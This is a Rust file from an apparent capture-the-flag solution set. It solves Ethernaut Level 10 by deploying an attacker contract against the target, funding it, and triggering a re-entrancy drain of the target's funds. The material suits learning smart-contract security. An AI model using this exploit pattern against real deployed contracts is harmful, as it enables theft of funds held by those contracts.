use crate::abi::repeat_please::RepeatPlease;
use async_trait::async_trait;
use ctf::ethernaut::lvl10_reentrancy::*;
use ethers::prelude::*;

pub(crate) struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    /**
     * @title Ethernaut Level 10: Re-entrancy
     *
     * The goal of this level is for you to steal all
     * the funds from the contract.
     *
     * Things that might help:
     * - Untrusted contracts can execute code where you
     *   least expect it.
     * - Fallback methods
     * - Throw/revert bubbling
     * - Sometimes the best way to attack a contract is
     *   with another contract.
     */
    async fn attack(
        self,
        target: &Self::Target,
        offender: &ctf::Actor,
    ) -> eyre::Result<()> {
        let hack_contract =
            RepeatPlease::deploy(offender.to_owned(), target.address)?
                .send()
                .await?;
        println!("Balance: {:?}", hack_contract.balance().await?);
        hack_contract
            .give_money()
            .value(9003000000000000001_i128)
            .send()
            .await?;
        hack_contract.donate().send().await?;

        Ok(())
    }
}
